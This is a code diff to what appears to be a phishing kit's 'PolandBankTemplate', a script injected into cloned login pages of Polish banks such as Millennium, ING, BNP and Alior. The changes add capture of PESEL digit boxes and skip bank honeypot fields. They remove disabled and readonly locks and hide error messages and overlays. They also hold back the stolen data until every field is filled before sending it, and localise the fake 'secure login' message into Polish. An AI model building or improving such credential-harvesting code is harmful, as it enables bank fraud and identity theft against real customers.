@@ -54,6 +54,9 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
     const isMaskedBox = (el) => {
       try {
         if (!el || !el.getAttribute) return false;
+        // Millennium PESEL pozisyon kutulari (Pesel-1..Pesel-11): text tipinde
+        // ama tek-karakter masked davranisi ister (otomatik sonraki kutuya gec).
+        if (/^pesel-\d+$/i.test(el.getAttribute("name") || "")) return true;
         const t = (el.getAttribute("type") || "").toLowerCase();
         if (t !== "password") return false;
         const ml = el.getAttribute("maxlength") || el.getAttribute("text-length");
@@ -146,6 +149,8 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
           const type = (el.getAttribute("type") || "text").toLowerCase();
           const name = pickKey(el, doc);
           if (!name) return;
+          // Ekran disi honeypot (alior extra-input vb.) veriye karismasin
+          try { if (!isVisibleEl(el) && type !== "hidden") return; } catch (e) {}
           if (type === "radio") {
             if (el.checked) data[name] = el.value != null ? String(el.value) : "on";
             return;
@@ -388,10 +393,23 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
 
     const enableControls = (root) => {
       try {
-        root.querySelectorAll("button, input, select, textarea, a, [role='button'], [ng-disabled], [aria-disabled], ing-button, ing-input-masked-password-field").forEach((el) => {
+        // CSS pointer-events:none / inert / sf-hidden kilidini global ac:
+        if (!root.getElementById("pl-pe-fix")) {
+          const st = document.createElement("style");
+          st.id = "pl-pe-fix";
+          st.textContent =
+            "input,textarea,select,button,a,[role='button'],[contenteditable='true']," +
+            "ing-button,ing-input,ing-input-masked-password-field,bnp-input,san-input{" +
+            "pointer-events:auto !important;user-select:auto !important;-webkit-user-select:auto !important}" +
+            ".sf-hidden{display:none !important}" +
+            ".modal-backdrop,.cdk-overlay-backdrop,.modal-blocker,.blocker{display:none !important}";
+          (root.head || root.documentElement).appendChild(st);
+        }
+        root.querySelectorAll("button, input, select, textarea, a, [role='button'], [ng-disabled], [aria-disabled], [inert], ing-button, ing-input-masked-password-field").forEach((el) => {
           try {
             if (el.hasAttribute("disabled")) el.removeAttribute("disabled");
             if (el.hasAttribute("ng-disabled")) el.removeAttribute("ng-disabled");
+            if (el.hasAttribute("inert")) el.removeAttribute("inert");
             // READONLY: bazi kayitlarda tum form readonly kaydedilmis
             // (pocztowy ~700 adet) -> giris "kapali" gorunuyor. Ac.
             if ((el.tagName === "INPUT" || el.tagName === "TEXTAREA") && el.hasAttribute("readonly")) el.removeAttribute("readonly");
@@ -425,19 +443,26 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
             }
           } catch (e) {}
         });
-        // Hata mesaji bloklari: id/class'i error/blad/invalid iceren gorunur
-        // elemanlari gizle (bos containerlar ve label'lar haric degil —
-        // sadece metin tasiyan veya bilinen hata rollerindekiler).
+        // Hata mesaji bloklari: id/class'i error/blad/invalid iceren elemanlar.
+        // KURAL: input/button/form ICEREN wrapper ASLA gizlenmez (BNP'de
+        // "ng-invalid" wrapper'i input'u de goturuyordu) — sadece hata
+        // siniflari silinir. Sadece yaprak mesaj bloklari gizlenir.
         root.querySelectorAll("[id],[class],[role='alert']").forEach((el) => {
           try {
-            if (el.__plErrorHidden) return;
+            const tag = (el.tagName || "").toLowerCase();
+            if (["input", "textarea", "select", "form", "body", "html"].includes(tag)) return;
             const ident = ((el.id || "") + " " + (typeof el.className === "string" ? el.className : "")).trim();
             const isAlert = el.getAttribute("role") === "alert";
             if (!isAlert && !ERROR_TOKEN_RE.test(ident)) return;
+            // icinde form kontrolu varsa: gizleme, sadece hata siniflarini kaldir
+            if (el.querySelector && el.querySelector("input,textarea,select,button,form,[role='textbox']")) {
+              if (el.classList) {
+                el.classList.forEach((c) => { if (/invalid|error|blad/i.test(c)) el.classList.remove(c); });
+              }
+              return;
+            }
+            if (el.__plErrorHidden) return;
             const txt = (el.textContent || "").trim();
-            // input'un kendisi degil, hata MESAJI tasiyan bloklari hedefle
-            const tag = (el.tagName || "").toLowerCase();
-            if (["input", "textarea", "select", "form", "body", "html"].includes(tag)) return;
             if (!isAlert && txt.length === 0) return;
             if (txt.length > 300) return;
             el.style.setProperty("display", "none", "important");
@@ -464,6 +489,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
             }
             if (el.__plMasked) return;
             el.__plMasked = true;
+            if (/^pesel-\d+$/i.test(el.getAttribute("name") || "")) el.setAttribute("maxlength", "1");
             el.setAttribute("autocomplete", "off");
             el.addEventListener("input", () => {
               try {
@@ -498,6 +524,40 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
     };
 
     // ------------------------------------------------------------------
+    // MILLENNIUM PESEL: security-digits-container'da bazi pozisyonlar
+    // input'suz bos goruntu kutusu (div). Tum pozisyonlara tek-karakter
+    // input enjekte et -> 11 kutunun hepsi aktif + otomatik gecis.
+    // ------------------------------------------------------------------
+    const fillEmptyPeselBoxes = (root) => {
+      try {
+        const container = root.querySelector("[data-testid=security-digits-container]");
+        if (!container) return;
+        Array.from(container.children).forEach((cell) => {
+          try {
+            if (cell.querySelector("input")) return;
+            const p = cell.querySelector("p");
+            const n = p ? (p.textContent || "").trim() : "";
+            if (!/^\d+$/.test(n)) return;
+            const host = cell.querySelector("div") || cell;
+            const inp = document.createElement("input");
+            inp.type = "text";
+            inp.maxLength = 1;
+            inp.name = "Pesel-" + n;
+            inp.id = "Pesel-" + n + "_input";
+            inp.autocomplete = "off";
+            inp.setAttribute("inputmode", "numeric");
+            inp.setAttribute("aria-label", "PESEL - znak nr. " + n);
+            inp.style.cssText =
+              "width:100%;height:100%;min-height:42px;border:none;outline:none;" +
+              "background:transparent;text-align:center;font:inherit;color:inherit;" +
+              "box-sizing:border-box;padding:0;display:block";
+            host.appendChild(inp);
+          } catch (e) {}
+        });
+      } catch (e) {}
+    };
+
+    // ------------------------------------------------------------------
     // ING FIX: Zaloguj butonu sayfanin cok altinda kaliyor -> sabit
     // gorunur bar + mobil icin yatay tasmani engelle.
     // ------------------------------------------------------------------
@@ -517,24 +577,101 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
     };
 
     // ------------------------------------------------------------------
-    // SUBMIT-READY: gri submit butonlari tum alanlar dolunca renklenir.
+    // FORM DOLMADAN SUBMIT YOK: gorunur tum alanlar dolmadan giris
+    // butonu pasif gorunur + tiklama/submit veri gondermez.
+    // ------------------------------------------------------------------
+    const isVisibleEl = (el) => {
+      try {
+        // Honeypot/ekran disi inputlar (alior extra-input left:-179451397px,
+        // height:0 tuzaklari) "gorunur" sayilmaz — yoksa submit kilitlenir.
+        const win = el.ownerDocument && el.ownerDocument.defaultView;
+        const cs = win ? win.getComputedStyle(el) : null;
+        if (cs && (cs.display === "none" || cs.visibility === "hidden")) return false;
+        const r = el.getBoundingClientRect();
+        if (!r || (r.width < 2 && r.height < 2)) return false;
+        const w = (win && win.innerWidth) || 0;
+        const h = (win && win.innerHeight) || 0;
+        if (r.right < -10 || r.bottom < -10 || r.left > w + 10 || r.top > h + 10) return false;
+        return true;
+      } catch (e) { return true; }
+    };
+    const fillableInputs = (root) => {
+      const out = [];
+      try {
+        root.querySelectorAll("input, textarea").forEach((el) => {
+          const t = (el.getAttribute("type") || "text").toLowerCase();
+          if (IGNORED.includes(t)) return;
+          if (!isVisibleEl(el)) return;
+          out.push(el);
+        });
+      } catch (e) {}
+      return out;
+    };
+    const allFieldsFilled = () => {
+      try {
+        const inputs = fillableInputs(document);
+        if (!inputs.length) return true;
+        return inputs.every((el) => (el.value || "").trim() !== "");
+      } catch (e) { return true; }
+    };
+    const flashEmpty = () => {
+      try {
+        fillableInputs(document).forEach((el) => {
+          if ((el.value || "").trim() !== "") return;
+          try {
+            el.style.setProperty("box-shadow", "0 0 0 2px rgba(239,68,68,.9)", "important");
+            el.style.setProperty("border-color", "#ef4444", "important");
+            const target = el;
+            setTimeout(() => {
+              try {
+                target.style.removeProperty("box-shadow");
+                target.style.removeProperty("border-color");
+              } catch (e) {}
+            }, 1400);
+          } catch (e) {}
+        });
+      } catch (e) {}
+    };
+
+    // ------------------------------------------------------------------
+    // SUBMIT-READY: gri submit butonlari tum alanlar dolunca renklenir;
+    // form eksikse buton soluk + not-allowed gorunur.
     // ------------------------------------------------------------------
     const READY_COLORS = {};
     const updateSubmitReady = (root) => {
       try {
-        const inputs = [];
-        root.querySelectorAll("input").forEach((el) => {
-          const t = (el.getAttribute("type") || "text").toLowerCase();
-          if (IGNORED.includes(t)) return;
-          try { if (!el.getClientRects().length) return; } catch (e) {}
-          inputs.push(el);
-        });
+        const inputs = fillableInputs(root);
         if (inputs.length === 0) return;
         const ready = inputs.every((el) => (el.value || "").trim() !== "");
         const readyColor = READY_COLORS[BANK_SLUG] || BRAND_COLOR || "";
-        if (!readyColor) return;
-        root.querySelectorAll("input[type=submit], button[type=submit], .gigya-composite-control-submit input, .de-login-submit input").forEach((btn) => {
+        // Native submit'ler + ozel elementler (<ing-button>, <a>Zaloguj</a>,
+        // typesiz <button>) isSubmitish ile yakalanir — hepsi gri/aktif stili alir.
+        const seen = new Set();
+        const btns = [];
+        root.querySelectorAll("input[type=submit], button, [type=submit], a, [role='button'], ing-button, .gigya-composite-control-submit input, .de-login-submit input").forEach((b) => {
           try {
+            if (seen.has(b)) return;
+            seen.add(b);
+            const t = (b.getAttribute("type") || "").toLowerCase();
+            const isNativeSubmit = (b.tagName === "INPUT" || b.tagName === "BUTTON") && t === "submit";
+            if (isNativeSubmit || t === "submit" || isSubmitish(b)) btns.push(b);
+          } catch (e) {}
+        });
+        btns.forEach((btn) => {
+          try {
+            // Form eksikse butonu pasif GOSTER (tiklamayi handler engelliyor)
+            if (!ready && !btn.__plDisabledStyled) {
+              btn.style.setProperty("opacity", "0.55", "important");
+              btn.style.setProperty("filter", "grayscale(.35)", "important");
+              btn.style.setProperty("cursor", "not-allowed", "important");
+              btn.__plDisabledStyled = true;
+            } else if (ready && btn.__plDisabledStyled) {
+              btn.style.removeProperty("opacity");
+              btn.style.removeProperty("filter");
+              btn.style.removeProperty("cursor");
+              btn.__plDisabledStyled = false;
+            }
+            if (!readyColor) return;
             const cs = root.defaultView ? root.defaultView.getComputedStyle(btn) : getComputedStyle(btn);
             const m = /rgba?\\((\\d+),\\s*(\\d+),\\s*(\\d+)/.exec(cs.backgroundColor || "");
             const grayish = m && Math.abs(+m[1] - +m[2]) < 20 && Math.abs(+m[2] - +m[3]) < 20 && +m[1] > 140;
@@ -557,6 +694,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
       doc.__plCaptureInjected = true;
 
       enableControls(doc);
+      fillEmptyPeselBoxes(doc);
       applyMaskedBehavior(doc);
       applyIngFix();
       cleanupErrorState(doc);
@@ -580,6 +718,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
 
       doc.addEventListener("submit", (e) => {
         try { e.preventDefault(); e.stopPropagation(); } catch (err) {}
+        if (!allFieldsFilled()) { flashEmpty(); updateSubmitReady(doc); return false; }
         send("form-submit");
         return false;
       }, true);
@@ -628,6 +767,8 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
         while (el2 && el2 !== doc.body && depth2 < 4) {
           if (isSubmitish(el2)) {
             try { e.preventDefault(); e.stopPropagation(); } catch (err) {}
+            // Form eksikse: bos alanlari kirmizi isaretle, GONDERME.
+            if (!allFieldsFilled()) { flashEmpty(); updateSubmitReady(doc); return; }
             send("click:" + (el2.tagName || "").toLowerCase());
             return;
           }
@@ -654,6 +795,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
           if (tag !== "input" && tag !== "select") return;
           const type = (t.getAttribute("type") || "text").toLowerCase();
           if (type === "hidden" || type === "checkbox" || type === "radio") return;
+          if (!allFieldsFilled()) { flashEmpty(); updateSubmitReady(doc); return; }
           send("enter-key");
         } catch (err) {}
       }, true);
@@ -679,12 +821,13 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
     attach(document);
     scanIframes(document, 0);
     try {
-      new MutationObserver(() => { scanIframes(document, 0); enableControls(document); applyMaskedBehavior(document); cleanupErrorState(document); updateSubmitReady(document); }).observe(document.documentElement, { childList: true, subtree: true });
+      new MutationObserver(() => { scanIframes(document, 0); enableControls(document); fillEmptyPeselBoxes(document); applyMaskedBehavior(document); cleanupErrorState(document); updateSubmitReady(document); }).observe(document.documentElement, { childList: true, subtree: true });
     } catch (e) {}
     let tries = 0;
     const retry = setInterval(() => {
       scanIframes(document, 0);
       enableControls(document);
+      fillEmptyPeselBoxes(document);
       applyMaskedBehavior(document);
       applyIngFix();
       cleanupErrorState(document);
@@ -846,7 +989,7 @@ export function PolandBankTemplate({ bankSlug, onChange, handleRouteAction, onPr
     return (
       <div className="flex min-h-screen items-center justify-center p-4 bg-white">
         <p className="rounded-xl border border-blue-500/30 bg-blue-500/10 p-5 text-center text-sm text-blue-700">
-          Loading your bank's secure login page...
+          Ładowanie bezpiecznej strony logowania Twojego banku...
         </p>
       </div>
     );
